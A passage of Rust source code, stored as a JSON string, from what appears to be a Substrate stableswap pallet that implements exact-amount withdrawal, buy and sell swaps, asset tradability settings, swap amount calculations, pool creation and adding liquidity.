amount)?;\n\n\t\t\t// All done and updated. let's call the on_liquidity_changed hook.\n\t\t\tSelf::call_on_liquidity_change_hook(pool_id, &initial_reserves, share_issuance)?;\n\n\t\t\tSelf::deposit_event(Event::LiquidityRemoved {\n\t\t\t\tpool_id,\n\t\t\t\twho,\n\t\t\t\tshares: share_amount,\n\t\t\t\tamounts: vec![AssetAmount { asset_id, amount }],\n\t\t\t\tfee,\n\t\t\t});\n\n\t\t\tOk(())\n\t\t}\n\n\t\t/// Remove liquidity from selected pool by specifying exact amount of asset to receive.\n\t\t///\n\t\t/// Similar to `remove_liquidity_one_asset` but LP specifies exact amount of asset to receive instead of share amount.\n\t\t///\n\t\t/// Parameters:\n\t\t/// - `origin`: liquidity provider\n\t\t/// - `pool_id`: Pool Id\n\t\t/// - `asset_id`: id of asset to receive\n\t\t/// - 'amount': amount of asset to receive\n\t\t/// - 'max_share_amount': Slippage limit. Max amount of shares to burn.\n\t\t///\n\t\t/// Emits `LiquidityRemoved` event when successful.\n\t\t#[pallet::call_index(6)]\n\t\t#[pallet::weight(<T as Config>::WeightInfo::withdraw_asset_amount()\n\t\t\t\t\t\t\t.saturating_add(T::Hooks::on_liquidity_changed_weight(MAX_ASSETS_IN_POOL as usize)))]\n\t\t#[transactional]\n\t\tpub fn withdraw_asset_amount(\n\t\t\torigin: OriginFor<T>,\n\t\t\tpool_id: T::AssetId,\n\t\t\tasset_id: T::AssetId,\n\t\t\tamount: Balance,\n\t\t\tmax_share_amount: Balance,\n\t\t) -> DispatchResult {\n\t\t\tlet who = ensure_signed(origin)?;\n\n\t\t\tensure!(\n\t\t\t\tSelf::is_asset_allowed(pool_id, asset_id, Tradability::REMOVE_LIQUIDITY),\n\t\t\t\tError::<T>::NotAllowed\n\t\t\t);\n\t\t\tensure!(amount > Balance::zero(), Error::<T>::InvalidAssetAmount);\n\n\t\t\t// Retrieve pool state.\n\t\t\tlet pool = Pools::<T>::get(pool_id).ok_or(Error::<T>::PoolNotFound)?;\n\t\t\tlet asset_idx = pool.find_asset(asset_id).ok_or(Error::<T>::AssetNotInPool)?;\n\t\t\tlet pool_account = Self::pool_account(pool_id);\n\t\t\tlet initial_reserves = pool\n\t\t\t\t.reserves_with_decimals::<T>(&pool_account)\n\t\t\t\t.ok_or(Error::<T>::UnknownDecimals)?;\n\t\t\tlet share_issuance = T::Currency::total_issuance(pool_id);\n\t\t\tlet amplification = Self::get_amplification(&pool);\n\n\t\t\t// Calculate how much shares user needs to provide to receive `amount` of asset.\n\t\t\tlet shares = hydra_dx_math::stableswap::calculate_shares_for_amount::<D_ITERATIONS>(\n\t\t\t\t&initial_reserves,\n\t\t\t\tasset_idx,\n\t\t\t\tamount,\n\t\t\t\tamplification,\n\t\t\t\tshare_issuance,\n\t\t\t\tpool.fee,\n\t\t\t)\n\t\t\t.ok_or(ArithmeticError::Overflow)?;\n\n\t\t\tensure!(shares <= max_share_amount, Error::<T>::SlippageLimit);\n\n\t\t\tlet current_share_balance = T::Currency::free_balance(pool_id, &who);\n\t\t\tensure!(\n\t\t\t\tcurrent_share_balance == shares\n\t\t\t\t\t|| current_share_balance.saturating_sub(shares) >= T::MinPoolLiquidity::get(),\n\t\t\t\tError::<T>::InsufficientShareBalance\n\t\t\t);\n\n\t\t\t// Burn shares and transfer asset to user.\n\t\t\tT::Currency::withdraw(pool_id, &who, shares)?;\n\t\t\tT::Currency::transfer(asset_id, &pool_account, &who, amount)?;\n\n\t\t\t// All done and updated. let's call the on_liquidity_changed hook.\n\t\t\tSelf::call_on_liquidity_change_hook(pool_id, &initial_reserves, share_issuance)?;\n\n\t\t\tSelf::deposit_event(Event::LiquidityRemoved {\n\t\t\t\tpool_id,\n\t\t\t\twho,\n\t\t\t\tshares,\n\t\t\t\tamounts: vec![AssetAmount { asset_id, amount }],\n\t\t\t\tfee: 0u128, // dev note: figure out the actual fee amount in this case. For now, we dont need it.\n\t\t\t});\n\n\t\t\tOk(())\n\t\t}\n\n\t\t/// Execute a swap of `asset_in` for `asset_out`.\n\t\t///\n\t\t/// Parameters:\n\t\t/// - `origin`: origin of the caller\n\t\t/// - `pool_id`: Id of a pool\n\t\t/// - `asset_in`: ID of asset sold to the pool\n\t\t/// - `asset_out`: ID of asset bought from the pool\n\t\t/// - `amount_in`: Amount of asset to be sold to the pool\n\t\t/// - `min_buy_amount`: Minimum amount required to receive\n\t\t///\n\t\t/// Emits `SellExecuted` event when successful.\n\t\t///\n\t\t#[pallet::call_index(7)]\n\t\t#[pallet::weight(<T as Config>::WeightInfo::sell()\n\t\t\t\t\t\t\t.saturating_add(T::Hooks::on_trade_weight(MAX_ASSETS_IN_POOL as usize)))]\n\t\t#[transactional]\n\t\tpub fn sell(\n\t\t\torigin: OriginFor<T>,\n\t\t\tpool_id: T::AssetId,\n\t\t\tasset_in: T::AssetId,\n\t\t\tasset_out: T::AssetId,\n\t\t\tamount_in: Balance,\n\t\t\tmin_buy_amount: Balance,\n\t\t) -> DispatchResult {\n\t\t\tlet who = ensure_signed(origin)?;\n\n\t\t\tensure!(\n\t\t\t\tSelf::is_asset_allowed(pool_id, asset_in, Tradability::SELL)\n\t\t\t\t\t&& Self::is_asset_allowed(pool_id, asset_out, Tradability::BUY),\n\t\t\t\tError::<T>::NotAllowed\n\t\t\t);\n\n\t\t\tensure!(\n\t\t\t\tamount_in >= T::MinTradingLimit::get(),\n\t\t\t\tError::<T>::InsufficientTradingAmount\n\t\t\t);\n\n\t\t\tensure!(\n\t\t\t\tT::Currency::free_balance(asset_in, &who) >= amount_in,\n\t\t\t\tError::<T>::InsufficientBalance\n\t\t\t);\n\n\t\t\tlet pool = Pools::<T>::get(pool_id).ok_or(Error::<T>::PoolNotFound)?;\n\t\t\tlet pool_account = Self::pool_account(pool_id);\n\t\t\tlet initial_reserves = pool\n\t\t\t\t.reserves_with_decimals::<T>(&pool_account)\n\t\t\t\t.ok_or(Error::<T>::UnknownDecimals)?;\n\n\t\t\tlet (amount_out, fee_amount) = Self::calculate_out_amount(pool_id, asset_in, asset_out, amount_in)?;\n\t\t\tensure!(amount_out >= min_buy_amount, Error::<T>::BuyLimitNotReached);\n\n\t\t\tT::Currency::transfer(asset_in, &who, &pool_account, amount_in)?;\n\t\t\tT::Currency::transfer(asset_out, &pool_account, &who, amount_out)?;\n\n\t\t\t//All done and updated. Let's call on_trade hook.\n\t\t\tSelf::call_on_trade_hook(pool_id, asset_in, asset_out, &initial_reserves)?;\n\n\t\t\tSelf::deposit_event(Event::SellExecuted {\n\t\t\t\twho,\n\t\t\t\tpool_id,\n\t\t\t\tasset_in,\n\t\t\t\tasset_out,\n\t\t\t\tamount_in,\n\t\t\t\tamount_out,\n\t\t\t\tfee: fee_amount,\n\t\t\t});\n\n\t\t\tOk(())\n\t\t}\n\n\t\t/// Execute a swap of `asset_in` for `asset_out`.\n\t\t///\n\t\t/// Parameters:\n\t\t/// - `origin`:\n\t\t/// - `pool_id`: Id of a pool\n\t\t/// - `asset_out`: ID of asset bought from the pool\n\t\t/// - `asset_in`: ID of asset sold to the pool\n\t\t/// - `amount_out`: Amount of asset to receive from the pool\n\t\t/// - `max_sell_amount`: Maximum amount allowed to be sold\n\t\t///\n\t\t/// Emits `BuyExecuted` event when successful.\n\t\t///\n\t\t#[pallet::call_index(8)]\n\t\t#[pallet::weight(<T as Config>::WeightInfo::buy()\n\t\t\t\t\t\t\t.saturating_add(T::Hooks::on_trade_weight(MAX_ASSETS_IN_POOL as usize)))]\n\t\t#[transactional]\n\t\tpub fn buy(\n\t\t\torigin: OriginFor<T>,\n\t\t\tpool_id: T::AssetId,\n\t\t\tasset_out: T::AssetId,\n\t\t\tasset_in: T::AssetId,\n\t\t\tamount_out: Balance,\n\t\t\tmax_sell_amount: Balance,\n\t\t) -> DispatchResult {\n\t\t\tlet who = ensure_signed(origin)?;\n\n\t\t\tensure!(\n\t\t\t\tSelf::is_asset_allowed(pool_id, asset_in, Tradability::SELL)\n\t\t\t\t\t&& Self::is_asset_allowed(pool_id, asset_out, Tradability::BUY),\n\t\t\t\tError::<T>::NotAllowed\n\t\t\t);\n\n\t\t\tensure!(\n\t\t\t\tamount_out >= T::MinTradingLimit::get(),\n\t\t\t\tError::<T>::InsufficientTradingAmount\n\t\t\t);\n\n\t\t\tlet pool = Pools::<T>::get(pool_id).ok_or(Error::<T>::PoolNotFound)?;\n\t\t\tlet pool_account = Self::pool_account(pool_id);\n\t\t\tlet initial_reserves = pool\n\t\t\t\t.reserves_with_decimals::<T>(&pool_account)\n\t\t\t\t.ok_or(Error::<T>::UnknownDecimals)?;\n\n\t\t\tlet (amount_in, fee_amount) = Self::calculate_in_amount(pool_id, asset_in, asset_out, amount_out)?;\n\n\t\t\tlet pool_account = Self::pool_account(pool_id);\n\n\t\t\tensure!(amount_in <= max_sell_amount, Error::<T>::SellLimitExceeded);\n\n\t\t\tensure!(\n\t\t\t\tT::Currency::free_balance(asset_in, &who) >= amount_in,\n\t\t\t\tError::<T>::InsufficientBalance\n\t\t\t);\n\n\t\t\tT::Currency::transfer(asset_in, &who, &pool_account, amount_in)?;\n\t\t\tT::Currency::transfer(asset_out, &pool_account, &who, amount_out)?;\n\n\t\t\t//All done and updated. Let's call on_trade_hook.\n\t\t\tSelf::call_on_trade_hook(pool_id, asset_in, asset_out, &initial_reserves)?;\n\n\t\t\tSelf::deposit_event(Event::BuyExecuted {\n\t\t\t\twho,\n\t\t\t\tpool_id,\n\t\t\t\tasset_in,\n\t\t\t\tasset_out,\n\t\t\t\tamount_in,\n\t\t\t\tamount_out,\n\t\t\t\tfee: fee_amount,\n\t\t\t});\n\n\t\t\tOk(())\n\t\t}\n\n\t\t#[pallet::call_index(9)]\n\t\t#[pallet::weight(<T as Config>::WeightInfo::set_asset_tradable_state())]\n\t\t#[transactional]\n\t\tpub fn set_asset_tradable_state(\n\t\t\torigin: OriginFor<T>,\n\t\t\tpool_id: T::AssetId,\n\t\t\tasset_id: T::AssetId,\n\t\t\tstate: Tradability,\n\t\t) -> DispatchResult {\n\t\t\tT::AuthorityOrigin::ensure_origin(origin)?;\n\n\t\t\tlet pool = Pools::<T>::get(pool_id).ok_or(Error::<T>::PoolNotFound)?;\n\t\t\tlet _ = pool.find_asset(asset_id).ok_or(Error::<T>::AssetNotInPool)?;\n\n\t\t\tAssetTradability::<T>::mutate(pool_id, asset_id, |current_state| {\n\t\t\t\t*current_state = state;\n\t\t\t});\n\n\t\t\tSelf::deposit_event(Event::TradableStateUpdated {\n\t\t\t\tpool_id,\n\t\t\t\tasset_id,\n\t\t\t\tstate,\n\t\t\t});\n\n\t\t\tOk(())\n\t\t}\n\t}\n\n\t#[pallet::hooks]\n\timpl<T: Config> Hooks<BlockNumberFor<T>> for Pallet<T> {}\n}\n\nimpl<T: Config> Pallet<T> {\n\t/// Calculates out amount given in amount.\n\t/// Returns (out_amount, fee_amount) on success. Note that fee amount is already subtracted from the out amount.\n\tfn calculate_out_amount(\n\t\tpool_id: T::AssetId,\n\t\tasset_in: T::AssetId,\n\t\tasset_out: T::AssetId,\n\t\tamount_in: Balance,\n\t) -> Result<(Balance, Balance), DispatchError> {\n\t\tlet pool = Pools::<T>::get(pool_id).ok_or(Error::<T>::PoolNotFound)?;\n\n\t\tlet index_in = pool.find_asset(asset_in).ok_or(Error::<T>::AssetNotInPool)?;\n\t\tlet index_out = pool.find_asset(asset_out).ok_or(Error::<T>::AssetNotInPool)?;\n\n\t\tlet pool_account = Self::pool_account(pool_id);\n\t\tlet initial_reserves = pool\n\t\t\t.reserves_with_decimals::<T>(&pool_account)\n\t\t\t.ok_or(Error::<T>::UnknownDecimals)?;\n\n\t\tensure!(!initial_reserves[index_in].is_zero(), Error::<T>::InsufficientLiquidity);\n\t\tensure!(\n\t\t\t!initial_reserves[index_out].is_zero(),\n\t\t\tError::<T>::InsufficientLiquidity\n\t\t);\n\n\t\tlet amplification = Self::get_amplification(&pool);\n\t\thydra_dx_math::stableswap::calculate_out_given_in_with_fee::<D_ITERATIONS, Y_ITERATIONS>(\n\t\t\t&initial_reserves,\n\t\t\tindex_in,\n\t\t\tindex_out,\n\t\t\tamount_in,\n\t\t\tamplification,\n\t\t\tpool.fee,\n\t\t)\n\t\t.ok_or_else(|| ArithmeticError::Overflow.into())\n\t}\n\n\t/// Calculates in amount given out amount.\n\t/// Returns (in_amount, fee_amount) on success. Note that fee amount is already added to the in amount.\n\tfn calculate_in_amount(\n\t\tpool_id: T::AssetId,\n\t\tasset_in: T::AssetId,\n\t\tasset_out: T::AssetId,\n\t\tamount_out: Balance,\n\t) -> Result<(Balance, Balance), DispatchError> {\n\t\tlet pool = Pools::<T>::get(pool_id).ok_or(Error::<T>::PoolNotFound)?;\n\n\t\tlet index_in = pool.find_asset(asset_in).ok_or(Error::<T>::AssetNotInPool)?;\n\t\tlet index_out = pool.find_asset(asset_out).ok_or(Error::<T>::AssetNotInPool)?;\n\n\t\tlet pool_account = Self::pool_account(pool_id);\n\t\tlet initial_reserves = pool\n\t\t\t.reserves_with_decimals::<T>(&pool_account)\n\t\t\t.ok_or(Error::<T>::UnknownDecimals)?;\n\n\t\tensure!(\n\t\t\tinitial_reserves[index_out].amount > amount_out,\n\t\t\tError::<T>::InsufficientLiquidity\n\t\t);\n\t\tensure!(!initial_reserves[index_in].is_zero(), Error::<T>::InsufficientLiquidity);\n\n\t\tlet amplification = Self::get_amplification(&pool);\n\t\thydra_dx_math::stableswap::calculate_in_given_out_with_fee::<D_ITERATIONS, Y_ITERATIONS>(\n\t\t\t&initial_reserves,\n\t\t\tindex_in,\n\t\t\tindex_out,\n\t\t\tamount_out,\n\t\t\tamplification,\n\t\t\tpool.fee,\n\t\t)\n\t\t.ok_or_else(|| ArithmeticError::Overflow.into())\n\t}\n\n\t#[require_transactional]\n\tfn do_create_pool(\n\t\tshare_asset: T::AssetId,\n\t\tassets: &[T::AssetId],\n\t\tamplification: NonZeroU16,\n\t\tfee: Permill,\n\t) -> Result<T::AssetId, DispatchError> {\n\t\tensure!(!Pools::<T>::contains_key(share_asset), Error::<T>::PoolExists);\n\t\tensure!(\n\t\t\tT::AssetInspection::exists(share_asset),\n\t\t\tError::<T>::ShareAssetNotRegistered\n\t\t);\n\n\t\tensure!(!assets.contains(&share_asset), Error::<T>::ShareAssetInPoolAssets);\n\n\t\tlet block_number = T::BlockNumberProvider::current_block_number();\n\n\t\tlet mut pool_assets = assets.to_vec();\n\t\tpool_assets.sort();\n\n\t\tlet pool = PoolInfo {\n\t\t\tassets: pool_assets\n\t\t\t\t.clone()\n\t\t\t\t.try_into()\n\t\t\t\t.map_err(|_| Error::<T>::MaxAssetsExceeded)?,\n\t\t\tinitial_amplification: amplification,\n\t\t\tfinal_amplification: amplification,\n\t\t\tinitial_block: block_number,\n\t\t\tfinal_block: block_number,\n\t\t\tfee,\n\t\t};\n\t\tensure!(pool.is_valid(), Error::<T>::IncorrectAssets);\n\t\tensure!(\n\t\t\tT::AmplificationRange::get().contains(&amplification),\n\t\t\tError::<T>::InvalidAmplification\n\t\t);\n\t\tfor asset in pool.assets.iter() {\n\t\t\tensure!(T::AssetInspection::exists(*asset), Error::<T>::AssetNotRegistered);\n\t\t}\n\n\t\tPools::<T>::insert(share_asset, pool);\n\t\tT::DustAccountHandler::add_account(&Self::pool_account(share_asset))?;\n\t\tOk(share_asset)\n\t}\n\n\t#[require_transactional]\n\tfn do_add_liquidity(\n\t\twho: &T::AccountId,\n\t\tpool_id: T::AssetId,\n\t\tassets: &[AssetAmount<T::AssetId>],\n\t) -> Result<Balance, DispatchError> {\n\t\tlet pool = Pools::<T>::get(pool_id).ok_or(Error::<T>::PoolNotFound)?;\n\t\tensure!(assets.len() <= pool.assets.len(), Error::<T>::MaxAssetsExceeded);\n\t\tlet mut added_assets = BTreeMap::<T::AssetId, Balance>::new();\n\t\tfor asset in assets.iter() {\n\t\t\tensure!(\n\t\t\t\tSelf::is_asset_allowed(pool_id, asset.asset_id, Tradability::ADD_LIQUIDITY),\n\t\t\t\tError::<T>::NotAllowed\n\t\t\t);\n\t\t\tensure!(\n\t\t\t\tasset.amount >= T::MinTradingLimit::get(),\n\t\t\t\tError::<T>::InsufficientTradingAmount\n\t\t\t);\n\t\t\tensure!(\n\t\t\t\tT::Currency::free_balance(asset.asset_id, who) >= asset.amount,\n\t\t\t\tError::<T>::InsufficientBalance\n\t\t\t);\n\t\t\tif added_assets.insert(asset.asset_id, asset.amount).is_some() {\n\t\t\t\treturn Err(Error::<T>::IncorrectAssets.into());\n\t\t\t}\n\t\t}\n\n\t\tlet pool_account = Self::pool_account(pool_id);\n\t\tlet mut initial_reserves = Vec::with_capacity(pool.assets.len());\n\t\tlet mut updated_reserves = Vec::with_capacity(pool.assets.len());\n\t\tlet mut added_amounts = Vec::with_capacity(pool.assets.len());\n\t\tfor pool_asset in pool.assets.iter() {\n\t\t\tlet decimals = Self::retrieve_decimals(*pool_asset).ok_or(Error::<T>::UnknownDecimals)?;\n\t\t\tlet reserve = T::Currency::free_balance(*pool_asset, &pool_account);\n\t\t\tinitial_reserves.push(AssetReserve {\n\t\t\t\tamount: reserve,\n\t\t\t\tdecimals,\n\t\t\t});\n\t\t\tif let Some(liq_added) = added_assets.remove(pool_asset) {\n\t\t\t\tlet inc_reserve = reserve.checked_add(liq_added).ok_or(Arith"
    }
  ]
}